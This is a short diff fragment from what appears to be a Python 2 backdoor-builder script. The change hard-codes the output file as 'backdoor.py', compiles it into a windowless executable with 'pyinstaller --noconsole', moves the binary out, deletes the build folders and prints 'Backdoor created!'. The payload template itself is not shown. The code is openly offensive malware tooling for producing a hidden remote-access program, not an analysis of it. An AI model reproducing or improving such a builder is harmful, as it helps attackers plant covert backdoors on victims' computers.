@@ -79,11 +79,11 @@ while True:
 '''
 
 try:
-    f = open (argv [-1], 'w')
+    f = open ('backdoor.py', 'w')
     f.write (maket)
     f.close ()
-    system ('pyinstaller --noconsole ' + argv [-1])
-    system ('rm -R dist build')
+    system ('pyinstaller --noconsole backdoor.py')
+    system ('mv dist/backdoor ./ && rm -R dist build')
     print Fore.CYAN + '[*] ' + Fore.RESET + ' Backdoor created!'
 except:
     print Fore.RED + '[!]' + Fore.RESET + ' Error!'
